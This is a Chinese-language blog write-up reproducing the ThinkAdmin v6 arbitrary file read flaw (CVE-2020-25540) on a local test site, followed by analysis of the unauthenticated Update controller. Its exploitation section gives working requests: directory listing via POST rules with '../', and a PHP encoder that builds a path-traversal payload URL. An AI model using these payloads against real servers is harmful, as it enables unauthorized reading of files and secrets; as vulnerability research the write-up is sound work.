<hr>
<p>title: Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)<br>no-emoji: false<br>date: 2020-09-27 16:46:41<br>tags:<br>top:</p>
<hr>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载 <a href="https://github.com/zoujingli/ThinkAdmin/tree/71d301c1626ea67351a54d4dc195c8c13879ae72">ThinkAdmin</a> 的过去版本</p>
<p>通过 Commit 找到修复的位置，下载修复版本的前一个版本<br><img src="20200927113634.png"><br>可以通过对比，重点关注修复的相关信息。<br><img src="20200927165921.png"><br>可以注意到对于任意文件读取的防护仅仅是加了 <code>禁止目录级别上跳</code> </p>
<p>下载老版本的方法为，找到修改前的 Commit 点击 Browse files 就可以下载过去的版本了。<br><img src="20200927170556.png"></p>
<p>按照配置创建和导入数据库，就安装成功了。<br><img src="20200927171052.png"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="获取版本信息"><a href="#获取版本信息" class="headerlink" title="获取版本信息"></a>获取版本信息</h3><p><code>http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/version</code><br><img src="20200927171443.png"></p>
<h3 id="读取网站目录"><a href="#读取网站目录" class="headerlink" title="读取网站目录"></a>读取网站目录</h3><p><code>http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/node</code><br>POST <code>rules=[&quot;/&quot;]</code><br><img src="20200927171635.png"></p>
<p>POST <code>rules=[&quot;../&quot;]</code><br><img src="20200927171826.png"></p>
<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><pre><code class="php">&lt;?php

function encode($content)
{
    [$chars, $length] = [&#39;&#39;, strlen($string = iconv(&#39;UTF-8&#39;, &#39;GBK//TRANSLIT&#39;, $content))];
    for ($i = 0; $i &lt; $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);
    return $chars;
}
var_dump(encode(&quot;public/static/../../poc.php&quot;));
?&gt;</code></pre>
<p><code>http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b34332r1a342w34</code><br><img src="20200927172454.png"><br><img src="20200927172527.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我下载的版本为漏洞修复前的版本，可能与网上的文章有些不同，不过大体上是相同的。</p>
<p><code>app/admin/controller/api/Update.php</code> 中引用了两个 function 可不通过登录认证就可使用。<br><img src="20200927173039.png"></p>
<p><code>\app\admin\controller\api\Update::version</code> 可以获取到当前版本<br><img src="20200927173422.png"></p>
<p><code>\app\admin\controller\api\Update::node</code><br><img src="20200927173458.png"></p>
<p>将 POST 传入的参数 rules &amp; ignore 传递给 <code>ModuleService::instance()-&gt;getChanges()</code><br>跟进函数 <code>\think\admin\service\ModuleService::getChanges</code><br><img src="20200927174009.png"></p>
<p>在 getChanges() 函数内，遍历传进的 <code>$rules</code> 数组，<br>$ignore可以不用关注，他会透过_scanList()去遍历$rules数组，调用scanDirectory()去递归遍历目录下的文件，最后在透过_getInfo()去获取文件名与哈希，由下面代码可以知道程序没有任何验证，攻击者可以在未授权的情况下读取服务器的文件列表。</p>
<p><code>\think\admin\service\ModuleService::_scanLocalFileHashList</code><br><img src="20200927174841.png"></p>
<p><code>\think\admin\service\NodeService::scanDirectory</code><br><img src="20200927174942.png"></p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2>